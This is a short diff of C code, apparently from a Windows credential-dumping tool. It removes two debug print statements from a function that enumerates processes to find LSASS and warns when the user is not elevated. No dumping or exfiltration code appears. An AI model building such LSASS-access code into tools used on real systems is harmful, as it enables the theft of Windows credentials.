@@ -74,16 +74,12 @@ HANDLE find_lsass(DWORD dwFlags)
 	HANDLE hProcess = NULL;
 	while (TRUE)
 	{
-		printf("find 1\n");
-
 		NTSTATUS status = NtGetNextProcess(hProcess, dwFlags, 0, 0, &hProcess);
 		if (status == STATUS_NO_MORE_ENTRIES)
 		{
 			PRINT_ERR("The " LSASS " process was not found. Are you elevated?");
 			return NULL;
 		}
-
-		printf("find 2\n");
 
 		if (!NT_SUCCESS(status))
 		{
